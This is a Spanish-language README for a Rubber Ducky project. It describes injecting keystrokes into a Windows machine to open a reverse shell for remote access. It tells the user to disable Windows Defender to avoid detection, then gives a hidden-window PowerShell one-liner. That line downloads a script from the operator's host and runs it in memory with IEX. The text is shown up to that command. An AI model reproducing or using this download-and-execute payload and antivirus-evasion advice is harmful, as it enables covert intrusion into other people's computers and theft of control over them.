# Revshell-Windows-rubber_ducky

## Descripción

Este proyecto está diseñado para un **Rubber Ducky**, que permite descargar y ejecutar un script de PowerShell en una máquina Windows. El script, `PS.ps1`, es utilizado para establecer una reverse shell, facilitando así el acceso remoto al sistema.

## Requisitos

- Rubber Ducky
- Acceso a una red local
- Desactivación de Windows Defender (opcional pero recomendado para evitar bloqueos)

## Funcionamiento

1. **Desactivar Windows Defender**: Antes de ejecutar el script, asegúrate de desactivar temporalmente Windows Defender para evitar la detección del script.
   
2. **Ejecutar el comando PowerShell**:
   Utiliza la combinación de teclas `Win + R` para abrir el cuadro de diálogo "Ejecutar", luego escribe el siguiente comando de PowerShell:

   ```powershell
   powershell -w hidden "IEX(New-Object Net.WebClient).downloadString('http://<tu-ip-local>:8080/PS.ps1')"
